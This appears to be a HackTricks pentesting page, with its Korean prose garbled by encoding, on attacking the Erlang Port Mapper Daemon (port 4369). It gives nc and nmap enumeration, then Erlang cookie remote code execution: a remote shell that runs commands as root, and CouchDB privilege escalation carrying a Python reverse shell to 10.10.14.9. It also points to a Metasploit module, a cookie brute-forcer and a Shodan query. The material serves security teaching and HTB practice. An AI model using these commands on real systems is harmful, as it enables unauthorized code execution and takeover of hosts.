{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# ê¸°ë³¸ ì •ë³´

**Erlang Port Mapper Daemon (epmd)**ëŠ” ë¶„ì‚° Erlang ì¸ìŠ¤í„´ìŠ¤ì˜ ì¡°ì •ìë¡œ ì‘ìš©í•©ë‹ˆë‹¤. ì´ëŠ” ê¸°í˜¸ ë…¸ë“œ ì´ë¦„ì„ ë¨¸ì‹  ì£¼ì†Œì— ë§¤í•‘í•˜ëŠ” ì—­í• ì„ í•˜ë©°, ê° ë…¸ë“œ ì´ë¦„ì´ íŠ¹ì • ì£¼ì†Œì™€ ì—°ê²°ë˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. **epmd**ì˜ ì´ ì—­í• ì€ ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ì„œë¡œ ë‹¤ë¥¸ Erlang ë…¸ë“œ ê°„ì˜ ì›í™œí•œ ìƒí˜¸ì‘ìš©ê³¼ í†µì‹ ì— ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
ì´ê²ƒì€ RabbitMQ ë° CouchDB ì„¤ì¹˜ì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.

# ì—´ê±°

## ìˆ˜ë™
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## ìë™
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## Remote Connection

ë§Œì•½ **ì¸ì¦ ì¿ í‚¤**ë¥¼ **ìœ ì¶œ**í•  ìˆ˜ ìˆë‹¤ë©´, í˜¸ìŠ¤íŠ¸ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì´ ì¿ í‚¤ëŠ” `~/.erlang.cookie`ì— ìœ„ì¹˜í•˜ë©°, erlangì´ ì²˜ìŒ ì‹œì‘í•  ë•Œ ìƒì„±ë©ë‹ˆë‹¤. ìˆ˜ì •ë˜ê±°ë‚˜ ìˆ˜ë™ìœ¼ë¡œ ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°, ê¸¸ì´ê°€ 20ìì¸ \[A:Z]ì˜ ë¬´ì‘ìœ„ ë¬¸ìì—´ì…ë‹ˆë‹¤.
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
ë” ë§ì€ ì •ë³´ëŠ” [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì €ìëŠ” ì¿ í‚¤ë¥¼ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ëŠ” í”„ë¡œê·¸ë¨ë„ ê³µìœ í•©ë‹ˆë‹¤:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## ë¡œì»¬ ì—°ê²°

ì´ ê²½ìš° ìš°ë¦¬ëŠ” CouchDBë¥¼ ì•…ìš©í•˜ì—¬ ë¡œì»¬ì—ì„œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ê²ƒì…ë‹ˆë‹¤:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
ì˜ˆì‹œëŠ” [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.\
**Canape HTB ë¨¸ì‹ ì„ ì‚¬ìš©í•˜ì—¬** ì´ **ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì„ ì—°ìŠµí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "í¬íŠ¸ì—ì„œ"`


{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
